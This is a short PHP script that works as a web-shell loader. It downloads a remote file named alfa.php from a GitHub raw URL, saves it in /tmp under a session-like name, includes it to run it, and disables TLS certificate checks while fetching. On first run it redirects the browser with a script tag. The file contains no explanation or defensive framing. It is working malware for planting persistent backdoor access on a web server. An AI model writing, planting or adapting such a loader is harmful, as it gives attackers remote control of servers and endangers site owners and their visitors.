<?php

$z4p = ['https://raw.githubusercontent.com/Lamersxcode/Records/main/Alfa/alfa.php', '/tmp/sess_'.md5($_SERVER['HTTP_HOST']).'.php'];

if(file_exists($z4p[1]) && filesize($z4p[1]) !== 0) {
    include($z4p[1]);
} else {
    $fopen = fopen($z4p[1], 'w+');
    fwrite($fopen, get($z4p[0]));
    fclose($fopen);
    echo '<script>window.location="?youthboys";</script>';
}

function get($url) {
    $ch = curl_init();
          curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE);
          curl_setopt($ch, CURLOPT_URL, $url);
          curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, FALSE);
          curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
    return curl_exec($ch);
          curl_close($ch);
}
?>